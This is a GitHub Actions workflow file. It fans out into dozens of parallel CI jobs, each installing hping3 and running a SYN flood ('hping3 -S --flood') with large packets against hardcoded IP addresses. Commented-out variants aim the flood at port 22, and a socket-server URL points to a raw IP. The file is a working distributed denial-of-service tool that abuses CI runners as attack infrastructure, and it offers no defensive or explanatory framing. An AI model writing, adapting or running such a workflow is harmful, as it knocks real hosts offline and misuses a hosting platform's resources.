on:
  workflow_call:
    inputs:
      start_index:
        required: true
        type: string
      batch_size:
        required: false
        type: string
        default: '40'
      total_jobs:
        required: false
        type: string
        default: '120'
      run_id:
        required: false
        type: string
        default: '1234567890'
      target_ips:
        required: false
        type: string
        default: '43.132.233.37,101.32.74.142'

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  generate-matrix:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set-matrix.outputs.matrix }}
    steps:
      - name: Generate Matrix
        id: set-matrix
        run: |
          start_index=$(echo "${{ inputs.start_index }}" | tr -d '"')
          batch_size=$(echo "${{ inputs.batch_size }}" | tr -d '"')
          if [ "$(expr "$total_jobs" + 0)" -lt "$(expr "$batch_size" + 0)" ]; then
            batch_size=$total_jobs
          fi
          end=$((start_index + batch_size - 1))
          jobs=$(seq $start_index $end | jq -R . | jq -s .)
          matrix="{\"job\":$jobs}"
          echo "matrix=$(echo $matrix | tr -d '\n')" >> $GITHUB_OUTPUT

  job:
    needs: generate-matrix
    strategy:
      matrix: ${{fromJson(needs.generate-matrix.outputs.matrix)}}
    runs-on: ubuntu-latest
    env:
      RUN_ID: ${{ inputs.run_id || github.run_id }}
      TOTAL_JOBS: ${{ inputs.total_jobs }}
      MATRIX_JOB_ID: ${{ matrix.job }}
      SOCKET_SERVER_URL: http://43.133.204.21:3000
    steps:
      - uses: actions/checkout@v4
        with:
          repository: Buc014960kPearson/Buc014960kPearson
          ref: main

      - name: Step 1
        run: |
          yarn

          sudo apt install hping3 -q

          # 将逗号分隔的 target_ips 转换为空格分隔
          IP_LIST=$(echo "${{ inputs.target_ips }}" | tr ',' ' ')
          echo "IP_LIST=${IP_LIST}" >> $GITHUB_ENV

          timeout 120s yarn start

      - name: Step 2
        run: |
          cat /proc/sys/net/ipv4/conf/all/rp_filter

          echo IP_LIST=$IP_LIST

          IFS=' ' read -ra IP_LIST <<< "$IP_LIST"
          for IP in "${IP_LIST[@]}"; do
            echo $IP
            echo "当前时间：$(date "+%Y-%m-%d %H:%M:%S")"
            sudo timeout 120s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 $IP || true
          done
          
          # for i in {1..4}; do
          #   sudo timeout 60s taskset -c $((i-1)) hping3 -S --flood -V -d 65400 -p 22 -s $((1000 + 16134 * (i-1)))-$((1000 + 16134 * i - 1)) $IP &
          # done
          # wait

          # sudo timeout 10s hping3 -S --flood -V -d 65400 -p 22 $IP
